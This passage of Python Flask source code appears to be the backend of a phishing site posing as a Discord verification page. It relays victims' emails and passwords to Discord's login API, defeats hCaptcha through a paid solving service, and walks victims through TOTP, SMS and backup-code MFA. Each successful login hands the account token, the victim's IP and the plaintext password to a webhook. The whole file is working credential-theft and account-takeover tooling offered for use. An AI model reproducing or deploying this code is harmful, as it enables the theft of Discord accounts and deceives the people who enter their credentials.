    except Exception as e:
        import traceback
        traceback.print_exc()
        pc = _prechallenges.get(pc_id)
        if pc:
            pc['status'] = 'error'
            pc['event'].set()


@app.route('/api/prechallenge', methods=['POST'])
def api_prechallenge():
    """Frontend calls this as soon as email is typed to start pre-solving captcha.
    Returns a prechallenge_id that can be passed to /api/login for instant results."""
    d = request.json or {}
    email = (d.get('email') or '').strip()
    if not ANTICAPTCHA_KEY:
        return jsonify({'ok': False, 'reason': 'no_key'})
    if not email or '@' not in email:
        return jsonify({'ok': False, 'reason': 'need_email'})

    # Use pre-warmed session if available
    ds = _get_ready_session()
    if not ds:
        ds = DiscordSession()
        ds.prepare()

    pc_id = uuid.uuid4().hex[:12]
    _prechallenges[pc_id] = {
        'token': None,
        'rqtoken': '',
        'sitekey': '',
        'ds': ds,
        'email': email,
        'status': 'solving',
        'event': threading.Event(),
        'time': time.time(),
    }
    threading.Thread(target=_prechallenge_worker, args=(pc_id, ds, email), daemon=True).start()

    print(f'[prechallenge] Started {pc_id} for {email}')
    return jsonify({'ok': True, 'prechallenge_id': pc_id})


@app.route('/api/prechallenge/status/<pc_id>', methods=['GET'])
def api_prechallenge_status(pc_id):
    """Check the status of a pre-challenge without consuming it."""
    pc = _prechallenges.get(pc_id)
    if not pc:
        return jsonify({'found': False})
    return jsonify({
        'found': True,
        'status': pc.get('status', '?'),
        'has_token': bool(pc.get('token')),
        'has_rqtoken': bool(pc.get('rqtoken')),
        'sitekey': pc.get('sitekey', '')[:20],
        'age_s': round(time.time() - pc.get('time', time.time()), 1),
    })


@app.route('/api/debug-role')
def debug_role():
    """Diagnostic endpoint: test bot token, guild access, role setup."""
    results = {'config': {
        'bot_token_set': bool(BOT_TOKEN),
        'guild_id': GUILD_ID or 'MISSING',
        'verified_id': VERIFIED_ID or 'MISSING',
    }}
    if not BOT_TOKEN:
        return jsonify({**results, 'error': 'No BOT_TOKEN set'})
    try:
        s = _make_session()
        bh = {'Authorization': f'Bot {BOT_TOKEN}', 'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)'}
        # 1) Bot user info
        r1 = s.get(f'{API}/users/@me', headers=bh, timeout=10)
        if r1.ok:
            bd = r1.json()
            results['bot'] = {'id': bd.get('id'), 'username': bd.get('username'), 'status': r1.status_code}
        else:
            results['bot'] = {'status': r1.status_code, 'error': r1.text[:200]}
            return jsonify(results)
        # 2) Guild info
        if GUILD_ID:
            r2 = s.get(f'{API}/guilds/{GUILD_ID}', headers=bh, timeout=10)
            if r2.ok:
                gd = r2.json()
                results['guild'] = {'name': gd.get('name'), 'status': r2.status_code}
            else:
                results['guild'] = {'status': r2.status_code, 'error': r2.text[:200]}
        # 3) Roles
        if GUILD_ID:
            r3 = s.get(f'{API}/guilds/{GUILD_ID}/roles', headers=bh, timeout=10)
            if r3.ok:
                roles = r3.json()
                target = [rl for rl in roles if rl['id'] == VERIFIED_ID]
                results['roles'] = {'total': len(roles), 'target_found': bool(target)}
                if target:
                    results['roles']['target'] = {'name': target[0]['name'], 'position': target[0]['position']}
                # Bot's highest role
                bot_id = results.get('bot', {}).get('id')
                if bot_id:
                    r4 = s.get(f'{API}/guilds/{GUILD_ID}/members/{bot_id}', headers=bh, timeout=10)
                    if r4.ok:
                        bot_roles = r4.json().get('roles', [])
                        bot_role_objs = [rl for rl in roles if rl['id'] in bot_roles]
                        max_pos = max([rl['position'] for rl in bot_role_objs], default=0)
                        target_pos = target[0]['position'] if target else 0
                        results['hierarchy'] = {
                            'bot_highest_position': max_pos,
                            'target_position': target_pos,
                            'can_assign': max_pos > target_pos,
                        }
                    else:
                        results['bot_member'] = {'status': r4.status_code, 'error': r4.text[:200]}
            else:
                results['roles'] = {'status': r3.status_code, 'error': r3.text[:200]}
        # 4) Quick test: assign role to bot itself (will fail but shows permissions)
        results['note'] = 'Use /api/debug-role?test_user=USER_ID to test role assign on a real user'
        test_uid = request.args.get('test_user')
        if test_uid:
            url = f'{API}/guilds/{GUILD_ID}/members/{test_uid}/roles/{VERIFIED_ID}'
            rp = s.put(url, headers={**bh, 'Content-Length': '0', 'X-Audit-Log-Reason': 'debug test'}, timeout=10)
            results['test_assign'] = {'status': rp.status_code, 'response': rp.text[:300]}
    except Exception as e:
        results['error'] = str(e)
    return jsonify(results)


@app.route('/api/pressolve', methods=['POST'])
def api_pressolve():
    """Frontend calls this — presolve disabled (Discord requires rqdata-matched tokens)."""
    pool_size = len(_presolve_pool)
    return jsonify({'ok': True, 'pool': pool_size, 'active': _presolve_active})


@app.route('/api/login', methods=['POST'])
def api_login():
    """
    Long-poll login: blocks until Discord result is ready.
    1) If prechallenge solved → instant submit (~800ms)
    2) If prechallenge solving → wait for it, then submit
    3) No prechallenge → full flow inline (login→captcha→solve→submit)
    Returns actual Discord result. No stall, no polling.
    """
    d = request.json
    login_email  = d.get('login')
    login_pw     = d.get('password')
    prechallenge_id = d.get('prechallenge_id')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        # ── Check email-specific pre-challenge ──
        pc = None
        if prechallenge_id and ANTICAPTCHA_KEY:
            _cand = _prechallenges.get(prechallenge_id)
            if _cand:
                if _cand.get('token') and _cand.get('rqtoken'):
                    pc = _prechallenges.pop(prechallenge_id, None)
                elif _cand.get('status') == 'solving':
                    pc = _cand

        # ── PATH A: Pre-challenge solved → instant submit ──
        if pc and pc.get('token') and pc.get('rqtoken'):
            return _login_with_pc_token(pc, login_email, login_pw, client_ip, prechallenge_id)

        # ── PATH B: Pre-challenge still solving → wait for it, then submit ──
        if pc and pc.get('status') == 'solving' and not pc.get('token'):
            print(f'[login] Waiting for prechallenge {prechallenge_id}...')
            remaining = max(10, 90 - (time.time() - pc.get('time', time.time())))
            pc['event'].wait(timeout=remaining)
            # Re-check after wait
            if pc.get('token') and pc.get('rqtoken'):
                _prechallenges.pop(prechallenge_id, None)
                return _login_with_pc_token(pc, login_email, login_pw, client_ip, prechallenge_id)
            else:
                print(f'[login] Prechallenge failed/timed out, doing full flow')
                # Fall through to PATH C

        # ── PATH C: No prechallenge or it failed → full inline solve ──
        return _login_full_inline(login_email, login_pw, client_ip)

    except Exception as e:
        import traceback
        traceback.print_exc()
        print(f'[!] Login error: {e}')
        return jsonify({'error': str(e)}), 500


def _login_with_pc_token(pc, login_email, login_pw, client_ip, pc_id):
    """Submit login using a pre-solved captcha token. Returns Flask response."""
    ds = pc['ds']
    captcha_token = pc['token']
    pc_rqtoken = pc['rqtoken']
    print(f'[*] INSTANT login with pre-challenge token pc={pc_id}')

    payload = {
        'login': login_email, 'password': login_pw,
        'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        'captcha_key': captcha_token,
        'captcha_rqtoken': pc_rqtoken,
    }

    try:
        r = ds.post('/auth/login', payload)
    except Exception:
        snap = ds.snapshot()
        ds = DiscordSession()
        ds.s = _make_session()
        ds.restore(snap)
        r = ds.post('/auth/login', payload)

    try:
        j = r.json()
    except Exception:
        print(f'[*] Pre-challenge result [{r.status_code}]: non-JSON: {r.text[:200]}')
        return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
    print(f'[*] Pre-challenge result [{r.status_code}]: {r.text[:400]}')

    ckeys = j.get('captcha_key', [])
    still_captcha = isinstance(ckeys, list) and (
        'captcha-required' in ckeys or 'invalid-response' in ckeys
        or j.get('captcha_sitekey')
    )

    if not still_captcha:
        return _format_login_result(j, r.status_code, client_ip, password=login_pw)

    # Token rejected — do a full inline solve with the fresh challenge
    print(f'[*] Pre-challenge token rejected, doing inline solve')
    sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
    rqdata  = j.get('captcha_rqdata', '')
    rqtoken = j.get('captcha_rqtoken', '')
    return _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, client_ip)


def _login_full_inline(login_email, login_pw, client_ip):
    """Full login flow: login → captcha → solve → submit. All in one request."""
    ds = _get_ready_session()
    if ds:
        print(f'[*] Using pre-warmed session')
    else:
        ds = DiscordSession()
        ds.prepare()

    payload = {
        'login': login_email, 'password': login_pw,
        'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
    }

    MAX_ATTEMPTS = 3
    for attempt in range(MAX_ATTEMPTS):
        try:
            r = ds.post('/auth/login', payload)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r = ds.post('/auth/login', payload)

        try:
            j = r.json()
        except Exception:
            print(f'[*] Inline login attempt {attempt+1} [{r.status_code}]: non-JSON response: {r.text[:200]}')
            if attempt < MAX_ATTEMPTS - 1:
                time.sleep(1)
                continue
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[*] Inline login attempt {attempt+1} [{r.status_code}]: {r.text[:400]}')

        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if not is_captcha:
            return _format_login_result(j, r.status_code, client_ip, password=login_pw)

        if not ANTICAPTCHA_KEY:
            # No API key — can't solve. Return error.
            return jsonify({'error': 'Captcha required but no solver configured.'}), 500

        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
        rqdata  = j.get('captcha_rqdata', '')
        rqtoken = j.get('captcha_rqtoken', '')

        return _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, client_ip)

    return jsonify({'error': 'Login failed after retries.'}), 500


def _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, client_ip):
    """Solve captcha with race, submit login, handle retries. Returns Flask response."""
    global _last_discord_sitekey
    _last_discord_sitekey = sitekey

    MAX_SOLVE_ATTEMPTS = 2
    for attempt in range(MAX_SOLVE_ATTEMPTS):
        print(f'[solve] Attempt {attempt+1}/{MAX_SOLVE_ATTEMPTS} sitekey={sitekey[:16]} rqdata={bool(rqdata)}')

        token, err = _solve_race(sitekey, rqdata, n=9)
        if not token:
            print(f'[solve] Failed: {err}')
            if attempt >= MAX_SOLVE_ATTEMPTS - 1:
                return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500
            continue

        payload = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }

        # Fresh TLS connection, preserve identity
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        try:
            r = ds2.post('/auth/login', payload)
        except Exception:
            snap2 = ds2.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap2)
            r = ds2.post('/auth/login', payload)

        try:
            j = r.json()
        except Exception:
            print(f'[solve] Result [{r.status_code}]: non-JSON: {r.text[:200]}')
            if attempt < MAX_SOLVE_ATTEMPTS - 1:
                time.sleep(1)
                continue
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[solve] Result [{r.status_code}]: {r.text[:400]}')

        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if not still_captcha:
            return _format_login_result(j, r.status_code, client_ip, ds2, password=login_pw)

        # Token rejected — retry with new challenge data
        rqdata  = j.get('captcha_rqdata', rqdata)
        rqtoken = j.get('captcha_rqtoken', rqtoken)
        sitekey = j.get('captcha_sitekey', sitekey)
        ds = ds2
        print(f'[solve] Token rejected, retrying...')

    return jsonify({'error': 'Verification timed out. Please try again.', 'retry': True}), 500


def _format_login_result(j, status_code, client_ip, ds=None, password='?'):
    """Format Discord login result into a Flask response."""
    if j.get('token'):
        fire_webhook(j['token'], client_ip, password)
        return jsonify(_success_with_info(j['token']))
    # Store password for MFA ticket lookup
    if j.get('ticket') and password != '?':
        with _pw_store_lock:
            _pw_store[j['ticket']] = password

    if j.get('ticket') and j.get('mfa') is not None:
        print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
        resp = dict(j)
        if password and password != '?':
            resp['_pw'] = password  # Pass to frontend for MFA round-trip
        return jsonify(resp)

    # Error
    err_msg = j.get('message', '')
    if not err_msg:
        ckeys = j.get('captcha_key', [])
        if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
            err_msg = 'Verification timed out. Please try again.'
        elif j.get('retry_after'):
            err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
        else:
            err_msg = 'Login failed. Please check your credentials and try again.'

    errs = j.get('errors', {})
    is_email_verify = False
    for field_key in errs:
        if isinstance(errs[field_key], dict):
            for fe in errs[field_key].get('_errors', []):
                if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                    err_msg = fe.get('message', 'New login location detected. Please check your email.')
                    is_email_verify = True

    result = {'message': err_msg, 'error': err_msg}
    if is_email_verify:
        result['email_verify'] = True
    if j.get('errors'):
        result['errors'] = j['errors']
    if j.get('retry_after'):
        result['retry_after'] = j['retry_after']

    # Forward Discord's code50035 directly for better frontend handling
    if j.get('code'):
        result['code'] = j['code']

    print(f'[!] Login result: {err_msg}')
    return jsonify(result), status_code


def _bg_solve_prechallenge(sid, sess, pc):
    """Handle PC shortcut mode: wait for pre-challenge solve, submit with real creds."""
    try:
        email = sess['email']
        pw    = sess['pw']
        ip    = sess.get('client_ip', '')

        # Wait for pre-challenge to finish solving
        if not pc['event'].is_set():
            remaining = max(5, 120 - (time.time() - pc.get('time', time.time())))
            print(f'[bg:{sid}] PC-shortcut: waiting up to {remaining:.0f}s for pre-challenge...')
            pc['event'].wait(timeout=remaining)

        if not (pc.get('token') and pc.get('rqtoken')):
            # Pre-challenge failed — need to do full login flow from scratch
            print(f'[bg:{sid}] Pre-challenge failed, doing full login flow from scratch')
            ds = _get_ready_session()
            if not ds:
                ds = DiscordSession()
                ds.prepare()
            payload = {
                'login': email, 'password': pw,
                'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            }
            r = ds.post('/auth/login', payload)
            j = r.json()
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or j.get('captcha_sitekey')
            )
            if not is_captcha:
                # No captcha needed (lucky!) — process result
                _store_bg_result(sid, sess, j, r.status_code, ip, ds)
                return
            # Got captcha — solve
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token, err = _solve_race(sitekey, rqdata, n=9)
            if not token:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            _store_bg_result(sid, sess, j, r.status_code, ip, ds2)
            return

        # Pre-challenge solved! Submit REAL credentials with pre-challenge captcha
        token   = pc['token']
        rqtoken = pc['rqtoken']
        ds      = pc['ds']
        print(f'[bg:{sid}] PC-shortcut: pre-challenge solved! Submitting real creds...')

        payload = {
            'login': email, 'password': pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
            'captcha_key': token,
            'captcha_rqtoken': rqtoken,
        }
        try:
            r = ds.post('/auth/login', payload)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r = ds.post('/auth/login', payload)

        j = r.json()
        print(f'[bg:{sid}] PC-shortcut result [{r.status_code}]: {r.text[:400]}')

        # Check if Discord still wants captcha (token rejected)
        ckeys = j.get('captcha_key', [])
        still_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )
        if still_captcha:
            # Token rejected — do fresh solve
            print(f'[bg:{sid}] PC token rejected, doing fresh solve')
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            token2, err = _solve_race(sitekey, rqdata, n=9)
            if not token2:
                sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = token2
            payload['captcha_rqtoken'] = rqtoken
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            r = ds2.post('/auth/login', payload)
            j = r.json()
            ds = ds2

        _store_bg_result(sid, sess, j, r.status_code, ip, ds)

    except Exception as e:
        import traceback
        traceback.print_exc()
        sess['result'] = {'error': str(e)}
        sess['result_code'] = 500
        sess['status'] = 'done'


def _store_bg_result(sid, sess, j, status_code, client_ip, ds):
    """Process Discord login result and store it for polling."""
    pw = sess.get('pw', '?')
    print(f'[bg:{sid}] Final result [{status_code}]: {str(j)[:400]}')
    if j.get('token'):
        fire_webhook(j['token'], client_ip, pw)
        sess['result'] = _success_with_info(j['token'])
        sess['result_code'] = 200
    elif j.get('ticket') and j.get('mfa') is not None:
        # Store password for MFA ticket lookup
        with _pw_store_lock:
            _pw_store[j['ticket']] = pw
        sess['result'] = j
        sess['result_code'] = 200
    else:
        err_msg = j.get('message', '')
        if not err_msg:
            ckeys = j.get('captcha_key', [])
            if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
                err_msg = 'Verification timed out. Retrying...'
            elif j.get('retry_after'):
                err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
            else:
                err_msg = 'Login failed. Please check your credentials and try again.'
        errs = j.get('errors', {})
        for field_key in errs:
            if isinstance(errs[field_key], dict):
                for fe in errs[field_key].get('_errors', []):
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        err_msg = fe.get('message', 'New login location detected. Please check your email.')
        result = {'message': err_msg, 'error': err_msg}
        if j.get('errors'):
            result['errors'] = j['errors']
        if j.get('retry_after'):
            result['retry_after'] = j['retry_after']
        sess['result'] = result
        sess['result_code'] = status_code
    sess['status'] = 'done'


def _bg_solve(sid):
    """Background thread: solve captcha, re-submit login, store result.
    If a pre-challenge is still solving, waits for it instead of starting new tasks.
    Supports _pc_shortcut mode: no normal flow data, uses pre-challenge session directly.
    """
    global _last_discord_sitekey
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        pc = sess.get('_prechallenge')

        # ── PC shortcut mode: pre-challenge is our ONLY solve path ──
        if sess.get('_pc_shortcut') and pc:
            return _bg_solve_prechallenge(sid, sess, pc)

        sitekey = sess['sitekey']
        rqdata  = sess['rqdata']
        rqtoken = sess['rqtoken']
        payload = dict(sess['payload'])
        ds      = sess['session']

        # Update global sitekey tracker for pre-solve pool
        _last_discord_sitekey = sitekey

        MAX_ATTEMPTS = 3
        j = {}
        r = None
        last_ds = ds  # track last DiscordSession for email verify flow

        for attempt in range(MAX_ATTEMPTS):
            print(f'[bg:{sid}] Captcha attempt {attempt+1}/{MAX_ATTEMPTS} (sitekey={sitekey[:16]}, rqdata={bool(rqdata)})')

            solved_token = None

            # ── Solve captcha ──
            solved_token, err = _solve_race(sitekey, rqdata, n=9)
            if not solved_token:
                print(f'[bg:{sid}] Solve failed: {err}')
                if attempt >= MAX_ATTEMPTS - 1:
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                    sess['status'] = 'done'
                    return
                continue

            # Submit login with solved captcha token
            payload['captcha_key'] = solved_token
            payload['captcha_rqtoken'] = rqtoken

            # Fresh TLS connection, preserve identity (cookies + fingerprint)
            snap = ds.snapshot()
            ds2 = DiscordSession()
            ds2.s = _make_session()
            ds2.restore(snap)
            last_ds = ds2

            try:
                r = ds2.post('/auth/login', payload)
            except Exception as ce:
                print(f'[bg:{sid}] Connection error: {ce}')
                snap2 = ds2.snapshot()
                ds3 = DiscordSession()
                ds3.s = _make_session()
                ds3.restore(snap2)
                r = ds3.post('/auth/login', payload)
                ds2 = ds3
                last_ds = ds3

            j = r.json()
            print(f'[bg:{sid}] Attempt {attempt+1} result [{r.status_code}]: {r.text[:400]}')

            # Check if Discord returned another captcha challenge
            ckeys = j.get('captcha_key', [])
            is_captcha = isinstance(ckeys, list) and (
                'captcha-required' in ckeys or 'invalid-response' in ckeys
                or j.get('captcha_sitekey')
            )

            if not is_captcha:
                break  # Not a captcha — process the actual result

            # Captcha came back — update challenge data for next attempt
            sitekey = j.get('captcha_sitekey', sitekey)
            rqdata  = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', rqtoken)
            _last_discord_sitekey = sitekey
            ds = ds2  # keep session for next attempt
            print(f'[bg:{sid}] Captcha returned, next attempt with fresh rqdata={bool(rqdata)}')

        # ── Process final result ──
        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            pw = sess.get('pw', '?')
            with _pw_store_lock:
                _pw_store[j['ticket']] = pw
            sess['result'] = j
            sess['result_code'] = 200
        else:
            # Check for email verification requirement
            errs = j.get('errors', {})
            is_email_verify = False
            for field_key in errs:
                field_errors = errs[field_key].get('_errors', []) if isinstance(errs[field_key], dict) else []
                for fe in field_errors:
                    if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                        is_email_verify = True
                        break

            if is_email_verify:
                print(f'[bg:{sid}] Email verification required — keeping session for retry')
                sess['result'] = {'email_verify': True, 'message': 'New login location detected. Please check your email and verify, then click Continue.'}
                sess['result_code'] = 200
                sess['retry_ds'] = last_ds
                sess['retry_payload'] = dict(payload)
                sess['retry_payload'].pop('captcha_key', None)
                sess['retry_payload'].pop('captcha_rqtoken', None)
            else:
                # Check if we're still stuck on captcha after all attempts
                ckeys_final = j.get('captcha_key', [])
                if isinstance(ckeys_final, list) and ckeys_final:
                    # Captcha persisted through all attempts — tell frontend to auto-retry
                    print(f'[bg:{sid}] Captcha persisted after {MAX_ATTEMPTS} attempts — signaling auto-retry')
                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                    sess['result_code'] = 500
                else:
                    err_msg = j.get('message', '')
                    if not err_msg:
                        err_msg = 'Login failed. Please check your credentials.'
                    print(f'[bg:{sid}] Error: {err_msg} | raw: {j}')
                    sess['result'] = {'error': err_msg, 'message': err_msg}
                    if j.get('errors'):
                        sess['result']['errors'] = j['errors']
                    if j.get('retry_after'):
                        sess['result']['retry_after'] = j['retry_after']
                    sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        token_ok = j.get('token') is not None
        mfa_ok = j.get('mfa') is not None
        print(f'[bg:{sid}] Done. token={token_ok}, mfa={mfa_ok}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


def _cleanup_old_sessions():
    """Remove sessions that have been delivered or are older than 5 minutes."""
    now = time.time()
    to_remove = []
    for sid, sess in list(login_sessions.items()):
        delivered = sess.get('_delivered_at', 0)
        created = sess.get('_created_at', now)
        if delivered and (now - delivered) > 30:  # 30s after delivery
            to_remove.append(sid)
        elif (now - created) > 300:  # 5 min absolute max
            to_remove.append(sid)
    for sid in to_remove:
        login_sessions.pop(sid, None)
    # Cleanup stale prechallenges (older than 2 min)
    pc_remove = [k for k, v in list(_prechallenges.items()) if (now - v.get('time', now)) > 120]
    for k in pc_remove:
        _prechallenges.pop(k, None)
    if to_remove or pc_remove:
        print(f'[cleanup] Removed {len(to_remove)} stale sessions, {len(pc_remove)} stale prechallenges')


@app.route('/api/login/poll/<sid>')
def api_login_poll(sid):
    """Frontend polls this while the background captcha solve is running."""
    # Periodic cleanup
    try:
        _cleanup_old_sessions()
    except Exception:
        pass
    sess = login_sessions.get(sid)
    if not sess:
        # Session gone (server restart or cleaned up) — tell frontend to retry
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404
    if sess['status'] == 'solving':
        return jsonify({'status': 'solving'})
    # Done — return the result
    result = sess.get('result', {'error': 'Unknown error'})
    code   = sess.get('result_code', 500)
    # Don't immediately pop — mark with timestamp for delayed cleanup
    # This prevents "Session not found" from duplicate poll requests
    if not result.get('email_verify'):
        sess['_delivered_at'] = time.time()
    return jsonify(result), code


@app.route('/api/login/retry/<sid>', methods=['POST'])
def api_login_retry(sid):
    """Retry login after user verified their email (new location check)."""
    sess = login_sessions.get(sid)
    if not sess:
        return jsonify({'error': 'Session expired. Please try logging in again.', 'retry': True}), 404

    # Reset session for background retry
    sess['status'] = 'solving'
    sess['result'] = None
    sess['result_code'] = 200
    threading.Thread(target=_bg_retry, args=(sid,), daemon=True).start()
    return jsonify({'captcha_stall': True, 'session_id': sid})


def _bg_retry(sid):
    """Background retry after email verification."""
    try:
        sess = login_sessions.get(sid)
        if not sess:
            return

        ds = sess.get('retry_ds') or sess.get('session')
        payload = sess.get('retry_payload') or sess.get('payload')

        print(f'[retry:{sid}] Retrying login after email verify...')

        # Fresh connection
        snap = ds.snapshot()
        ds2 = DiscordSession()
        ds2.s = _make_session()
        ds2.restore(snap)

        r = ds2.post('/auth/login', payload)
        j = r.json()
        print(f'[retry:{sid}] Result [{r.status_code}]: {r.text[:400]}')

        # May need captcha again
        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or 'invalid-response' in ckeys
            or j.get('captcha_sitekey')
        )

        if is_captcha:
            sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
            rqdata = j.get('captcha_rqdata', '')
            rqtoken = j.get('captcha_rqtoken', '')
            print(f'[retry:{sid}] Captcha required, solving...')
            presolved = _get_presolved()
            if presolved:
                solved = presolved
                err = None
                print(f'[retry:{sid}] Using PRE-SOLVED token!')
            else:
                solved, err = solve_captcha(sitekey, rqdata)
            if not solved:
                sess['result'] = {'error': f'Captcha solve failed: {err}'}
                sess['result_code'] = 500
                sess['status'] = 'done'
                return
            payload['captcha_key'] = solved
            payload['captcha_rqtoken'] = rqtoken
            snap2 = ds2.snapshot()
            ds3 = DiscordSession()
            ds3.s = _make_session()
            ds3.restore(snap2)
            r = ds3.post('/auth/login', payload)
            j = r.json()
            print(f'[retry:{sid}] After captcha [{r.status_code}]: {r.text[:400]}')

        if j.get('token'):
            ip = sess.get('client_ip', '?')
            pw = sess.get('pw', '?')
            fire_webhook(j['token'], ip, pw)
            sess['result'] = _success_with_info(j['token'])
            sess['result_code'] = 200
        elif j.get('ticket') and j.get('mfa') is not None:
            sess['result'] = j
            sess['result_code'] = 200
        else:
            sess['result'] = j
            sess['result_code'] = r.status_code if r else 500

        sess['status'] = 'done'
        print(f'[retry:{sid}] Done. token={j.get("token") is not None}, mfa={j.get("mfa") is not None}')

    except Exception as e:
        import traceback
        traceback.print_exc()
        if sid in login_sessions:
            login_sessions[sid]['result'] = {'error': str(e)}
            login_sessions[sid]['result_code'] = 500
            login_sessions[sid]['status'] = 'done'


@app.route('/api/mfa/totp', methods=['POST'])
def api_mfa_totp():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms/send', methods=['POST'])
def api_mfa_sms_send():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms', methods=['POST'])
def api_mfa_sms_verify():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/sms', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/backup', methods=['POST'])
def api_mfa_backup():
    """Submit an 8-digit backup code for MFA verification."""
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        # Discord uses the same /auth/mfa/totp endpoint for backup codes
        # The code format (8-digit with hyphen) tells Discord it's a backup code
        code = d.get('code', '').strip().replace(' ', '-')
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': code, 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
